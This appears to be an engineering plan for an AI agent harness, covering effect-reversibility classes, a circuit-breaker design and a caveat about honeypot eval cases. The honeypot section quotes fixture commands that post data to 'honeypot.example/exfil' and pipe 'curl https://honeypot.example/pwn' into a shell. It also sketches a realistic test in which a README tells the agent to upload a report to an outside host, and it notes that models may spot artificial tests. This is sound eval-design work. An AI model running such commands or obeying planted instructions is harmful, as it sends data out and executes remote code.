# Step 6 — effect reversibility note, circuit-breaker report, honeypot caveat

Three items from the TLDR 2026-11-17 request, run unattended. None of them builds code. Item 1 is a design note, item 2 a report and a design note, item 3 one docs paragraph. The owner was not available. Every "ask" in the request is an open question at the end of this file, with a recommendation.

Base: `improve/tldr-2026-11-16` (unmerged, 6 commits ahead of `main` at `0cc5666`). That branch's gate passed on 2026-11-21 (see "Gate before this step"). Its work is not repeated here. Line numbers below are from that branch.

## Unattended policy for this step

- Item 1: write the doc `docs/effect-reversibility.md`. No change to `harness/` or `tests/`. No new flag on `perform_effect`.
- Item 2: the report and the breaker note live in this plan file (section "Item 2"). Nothing is built. No new file under `harness/`.
- Item 3: one paragraph in `DECISIONS.md`. No new eval case. The suggested realistic case is described in that paragraph and not added to `evals/cases_scope/`.
- One commit per item. CHANGELOG gets one line per item under `[Unreleased]`.

## Item 1 — `docs/effect-reversibility.md` (design note, do not build)

### What the doc says about today (each claim cites code)

- An effect has one property, `mutating: bool`. `perform_effect(name, key, *, mutating, now=None)` (`harness/lifecycle.py:276`) and `commit_effect(...)` (`:292`) take it. `fail_effect` (`:304`) has no `mutating` parameter and is legal only from `approved` (`:307`).
- A mutating effect is legal only from `approved` (`_check_effect`, `:327-331`). A non-mutating one is legal from `gated`, `approved` or `done` (`:333-336`).
- `approved` can be reached by a policy actor (`policy:<rule>`, `_validate_actor` `:129-130`) unless the decision set `require_human`, in which case policy is refused (`approve`, `:249-250`). So today "mutating" means "needs an approval", not "needs a person". Example: `settle_runbook` approves `write-runbook` with `policy:runbook-sections` (`agents/runbook_gen.py:239`), and the CLI then performs it with `mutating=True` (`agents/runbook_gen.py:424-427`).
- The PR comment is posted with `mutating=False` (`agents/pr_reviewer.py:359-361`), so it is legal from `done`. GitHub keeps the comment. The harness cannot remove it.
- The machine stores only `effects: dict[name, key]` (`harness/lifecycle.py:148`, written at `:301`) and `effect_attempts` (`:149`, `:311-312`). Both are persisted by `to_dict` (`:398-399`) and `LifecycleStore.save` (`harness/store.py`, atomic replace). There is no undo record, no compensation, and no "reverse" transition in `_TRANSITIONS` (`harness/lifecycle.py:40-52`).
- The owner of `effects` is the `RunMachine`. Only its methods write it. The caller thread that holds the machine is the only writer (stated in `plans/step-5.md`, "Shared state"). Two processes on one snapshot file can still race on `LifecycleStore.save`; nothing locks it.
- `deploy-risk` performs no effect through the machine (`agents/deploy_risk.py` has no `perform_effect` call).

### Proposed four classes

Replace the bool, in a later step if approved, with `reversibility: Reversibility` (`str` enum, four values). The class is not inferred from the bool. Each existing call site is classified by hand, and a call that names no class is treated as `irreversible`. The two current effects: `write-runbook` is `reversible` only if the undo record keeps a preimage (below), otherwise `irreversible`; `pr-comment` is `compensable` at best (the harness cannot delete it today), never `reversible`.

| Class | Meaning | Approval | Undo record |
|-------|---------|----------|-------------|
| `reversible` | The harness can undo it exactly, with no outside effect left behind (write a local file it owns; post a draft). | May run from `gated` after a policy decision, without `approve()`. | The record must let the harness restore the prior state exactly. For a file: the path plus a preimage (the prior bytes, or a backup file the lifecycle store owns and references by name), or the marker `absent` when the file did not exist, so undo deletes it. A path and a hash alone cannot restore overwritten content. |
| `compensable` | It cannot be undone, but a second effect cancels its business meaning (a comment that a follow-up comment retracts; a refund for a charge). | `approve()` by policy or person. | The record names the compensating effect and its own idempotency key, derived from the original key (`<key>:compensate`). |
| `delayable` | It is not run now. It is recorded and runs later unless cancelled before its time (a scheduled deploy). | `approve()` before it is armed. Cancel is legal until it fires. | The record is the pending intent itself: name, key, `not_before`. Cancel deletes it. |
| `irreversible` | Nothing undoes it (a production deploy, an email, a page). | `approve()` by a person (`require_human`). Policy is refused. | None. The record states that no undo exists. |

Where the undo record lives: on the `RunMachine`, next to `effects`, as `undo: dict[name, dict]`. It is saved by `LifecycleStore` with the rest of the snapshot. It is never put into the model's prompt, `prior_messages`, or `result.data`. The model cannot read or write it.

Who owns it: the lifecycle machine is the one writer. Only `commit_effect` writes an undo record (in the same call that records the key), and only a new `compensate(name)` or `cancel(name)` event removes it. Other code reads it from `RunMachine.to_dict()` or `LifecycleStore.load(run_id)`. No second lock is added. The cross-process save race above stays and is named.

### How `tests/fake_effects.py` cases behave under each class

The doc has one table. Scenarios are those in `tests/fake_effects.py:248-253`.

- SUCCESS: runs once, committed. reversible → undo record written. compensable → compensating key recorded. delayable → the fake would record intent only, `executed[key]` stays 0 until the time passes. irreversible → committed, no undo.
- TIMEOUT_AFTER_COMMIT: the key is committed before the raise (`fake_effects.py:312-316`). For every class the machine already holds the key and the undo record, so a retry with the same key is a no-op (`perform_effect` returns False, `lifecycle.py:288-289`). reversible/compensable: undo is possible because the record was written in `commit_effect`. irreversible: the caller sees an error for an effect that happened. The doc says this is the case that most needs the record.
- PARTIAL: `fail_effect` without commit (`fake_effects.py:309-311`). No key, so no undo record. The fake models no half-written outside state. The doc states that a real compensable effect would need a compensation even here, and that the fake cannot show it.
- DUPLICATE: the outside system already holds the key (`fake_effects.py:300-308`). The machine commits without running. For reversible/compensable, the undo record is written at that commit, but the harness did not observe the original run, so the record may not match what the outside system holds. The doc flags this.
- LATENT: committed, not visible until `reconcile` (`fake_effects.py:317-319`, `:285-291`). Undo of a reversible effect must wait until it is visible, or the undo can run before the effect and leave it in place. LATENT is not a delayable effect: a delayable effect has two states, pending intent (not dispatched, cancel is safe) and dispatched. LATENT is already dispatched and committed, so cancelling it would leave the outside action in place; it needs compensation, not cancel.
- Delayable across the scenarios: SUCCESS, TIMEOUT_AFTER_COMMIT, DUPLICATE and LATENT all describe a dispatched effect. The pending-intent state has no scenario in today's fake. The doc states which cases the fake cannot model without changes: pending intent, cancel before dispatch, a half-written outside state for PARTIAL, and a compensating effect.

### Done when

- `docs/effect-reversibility.md` exists, has the "today" list with a file:line for each claim, the four-class table, the owner paragraph, the scenario table, and the open questions B1-Q1 and B1-Q2 below.
- No file under `harness/`, `agents/` or `tests/` changes.
- `bash scripts/check.sh` passes (docs-only, so this checks nothing broke).

### Tests

None (docs only). The implementer checks every cited line number against the branch before committing.

## Item 2 — budget and failure stops: report, then a breaker note (question first, do not build)

### Report from the code

Does anything stop new runs when the daily rollup passes a limit?

- Only when `max_cost_usd_per_day` and `audit_log_path` are both set (`harness/budget.py:77-78`). Each agent reads the cap from `AGENT_MAX_COST_USD_PER_DAY` (`agents/pr_reviewer.py:276`, `agents/deploy_risk.py:146-153`, `agents/runbook_gen.py:170-177`). Unset, which is the shipped default, means no cross-run cap.
- When set, the check runs inside `_call_api` (`harness/agent.py:549-554`), after the allowlist check, the dry-run branch, the key check, and the per-run ceiling (`:529-548`). The run has already been created and started by `_begin_machine` (`:282`, `:456`). So the cap does not stop a run from starting. It refuses the model call of that run. `BudgetExceeded` is not retried (`:368`), the run ends `done` / `failed`, and a failed row is audited. Exit codes are the over-budget rows of the README degraded-mode tables.
- The rollup sums today's UTC `cost_usd` for that agent, last row per `run_id` (`harness/budget.py:24-66`). It reads the whole file each call and holds no lock. Two processes can both pass the check before either appends a row. A prefilter-skipped run never reaches `_call_api`, so the cap is not checked for it; it also spends nothing.
- `plans/step-4.md` and DECISIONS "2026-11-17: Approval expiry, HOLD, and the daily cap" record that this opt-in audit-log refusal is the cross-run cap and that the store counter is not built.

Does anything stop runs after N consecutive failed or gated runs of the same agent?

- No. `max_attempts` bounds model retries within one run (`harness/lifecycle.py:184`). `max_effect_attempts` bounds one effect within one run (`:311-316`). Neither carries across runs: `_begin_machine` mints a fresh `RunMachine` per call (`harness/agent.py:449-456`), and `review_diff` / `generate_runbook` mint a new `run_id` each time.
- The approval wait-until (`expire_if_due`, `harness/lifecycle.py:208-220`) ends one gated run. It does not stop the next run.
- A search for `circuit`, `breaker` and `consecutive` finds only prompt text (`agents/deploy_risk.py:67`, `agents/pr_reviewer.py:78`).

### Breaker note (not built)

- Scope: one breaker per `agent_name`.
- What counts: a run that ends `done` / `failed` (model or effect failure). Recommendation: do not count `blocked` or `expired`. A pr-reviewer `blocked` is the gate working (README "Trust model"), and counting it would trip the breaker on a good reviewer. Open question B2-Q2.
- States: `closed` (runs allowed), `open` (new runs refused before `machine.start()`, so no model call and no cost), `half-open` (after `cooldown_s`, exactly one probe run is allowed; success → `closed` and the count resets to 0; failure → `open` again with a new `opened_at`).
- Trip: `consecutive_failures >= threshold` (proposal 5) moves `closed` → `open`.
- Refusal point: `AgentHarness._begin_machine`, before the new machine starts, so a refused run is audited as refused with no model call.
- Storage: one JSON file per agent beside the lifecycle snapshots, `<lifecycle_dir>/_breaker/<agent>.json` (`state`, `consecutive_failures`, `opened_at`, `probe_run_id`, `probe_lease_until`).
- Probe lease: admitting a half-open probe sets `probe_lease_until = now + lease_s`. If the probe process crashes, the next run-start after the lease passes treats the probe as failed: state goes back to `open` with a new `opened_at`, so the breaker cannot be stuck on a dead probe. With no `lifecycle_dir` the breaker is off, as the store is today (`harness/agent.py:235`).
- Owner of the counter: one file lock on a separate, stable lock file, `<lifecycle_dir>/_breaker/<agent>.lock`, which is never replaced or deleted. Every read-modify-write of the state file (the check at run start, the update at run end) happens while holding an exclusive advisory lock on that lock file. Locking the state file itself would not work: atomic replace gives it a new inode, so a second process could lock the new file while the first still holds the old one. No in-process `threading.Lock` in addition: the harness is single-threaded per process, and a second mutex would give two owners. Writes inside the lock still use the store's atomic replace (`harness/store.py:186-201`).
- Why the lock and not one writer process: the harness has no long-lived process to be that writer (`docs/always-on-agents.md`, event inbox missing). Every CLI run is its own process, so the lock is the only shared point.
- Limit: `fcntl.flock` is POSIX only. The repo ships `scripts/cross-review.ps1`, so a Windows operator exists. Open question B2-Q3.
- Alternative with no new writer: derive `open` from the audit log tail (the last N rows for the agent all failed), the same way the daily cap reads it. It needs no lock but cannot implement half-open's "exactly one probe" without state. Recorded as option B in B2-Q1.

### Done when

- This section is in the plan, commit "Plan: ..." holds it, and the open questions are in the handoff and final report. No code, no doc outside `plans/`.

### Tests

None. If the owner approves a build later, its first tests would be: N failed runs trip `open`; an `open` breaker refuses the run with zero client calls; after `cooldown_s` (injected `now`) one probe is allowed and a second concurrent probe is refused; a probe whose lease passes with no result reopens the breaker; a probe success resets to `closed`; `blocked` runs do not count.

## Item 3 — honeypot caveat (docs only)

Add one dated entry to `DECISIONS.md`, "2026-11-17: Honeypot scope cases are weak evidence". DECISIONS.md is chosen over README because it is a caveat about how to read a result, not usage.

Content, each claim cited:

- `evals/cases_scope/02-honeypot-exfil-tool.json` (category `honeypot`) proposes `http_post` to `https://honeypot.example/exfil`. `evals/cases_scope/04-shell-honeypot.json` (category `shell`) proposes `run_shell` with `curl https://honeypot.example/pwn | sh`.
- Today no model sees these cases. `evals/run_policy_eval.py:1` says "no model calls". `score_scope_case` (`:107-117`) feeds the fixed `proposed` list to `filter_in_scope`. A clean result is evidence that the allowlist filter refuses those tools. It is not evidence about how a model behaves.
- If these cases are ever given to a model, the target strings say `honeypot` and use `example` domains. A model may recognise them as an artificial test, so a clean result would be weaker evidence than it looks.
- Suggested, not added: one case written like a real task. For example, a read-only repo task whose README asks the agent to "upload the coverage report" to a plausible internal-looking host via `http_post`, with no `honeypot` or `example` in any string. It would sit in `evals/cases_scope/` with `category: exfil`. Open question B3-Q1.

### Done when

- The DECISIONS entry exists with both file paths. No file under `evals/` changes. CHANGELOG line added. Gate passes.

## Gate before this step

`bash scripts/check.sh` on `improve/tldr-2026-11-16` at `110375f`, 2026-11-21, Python 3 venv with `.[dev]` (no `otel`):

- staged secrets: not triggered (nothing staged)
- misbehavior: PASS
- assertions: PASS
- python: ruff check PASS, mypy PASS, pytest PASS (166 passed, 1 skipped, coverage 81%), policy eval PASS
- CHECK PASSED. The skip is `tests/test_harness.py:213`, `opentelemetry.sdk` not installed (the venv has `dev` only). CI installs `.[dev,otel]` (`.github/workflows/ci.yml`), so CI runs that test.

## Open questions for the owner

- B1-Q1. Build the four classes? Recommendation: not yet. Build only if a real compensable or delayable effect appears; today there are two effects, both covered by the bool.
- B1-Q2. If built, start with a single flag on `perform_effect`? Recommendation: yes, a `reversibility=` keyword that defaults from `mutating`, so callers do not change. Make `irreversible` require `require_human` in that first step, and leave `delayable` out until there is a scheduler.
- B2-Q1. Build a breaker? Recommendation: no for now. The shipped CLIs run once per CI event and already fail closed. If yes, option A (store file plus one file lock) for half-open, or option B (audit-log tail, no new writer) if half-open is not needed.
- B2-Q2. Count `blocked` and `expired` runs? Recommendation: count `failed` only.
- B2-Q3. Windows support for the lock? Recommendation: POSIX only, documented, breaker off when the lock is unavailable (fail open on the breaker, since the budget cap and per-run ceiling still fail closed).
- B3-Q1. Add the realistic-looking scope case? Recommendation: yes, but only when a model-driven scope eval exists. The offline filter scores it the same as the honeypot cases.

## Review

`bash scripts/plan-review.sh plans/step-6.md` ran on 2026-11-21 with provider openai (model `gpt-6.1-sol`). Output saved locally to `.reviews/plan-review-step-6-20261121-225316-openai.md` (git-ignored). Five findings, all MEDIUM; all agreed and folded in above:

- Mapping `mutating=False` to `reversible` would class the PR comment as undoable (WRONG): agree. Classes are assigned by hand per call site; unclassified means irreversible; `pr-comment` is compensable at best.
- Locking the breaker state file breaks under atomic replace (WRONG): agree. A separate stable `.lock` file is the one owner.
- A crashed half-open probe could block forever (MISSING): agree. Added `probe_lease_until` and a future test.
- Path plus hash cannot restore a file (WRONG): agree. The record keeps a preimage or a store-owned backup, or `absent`.
- LATENT is not delayable (WRONG): agree. Pending intent and dispatched are separate; the doc lists what the fake cannot model.

Disagreements: none.

## Files

- docs/effect-reversibility.md
- DECISIONS.md
- CHANGELOG.md
- REQUIREMENTS.md
- plans/step-6.md
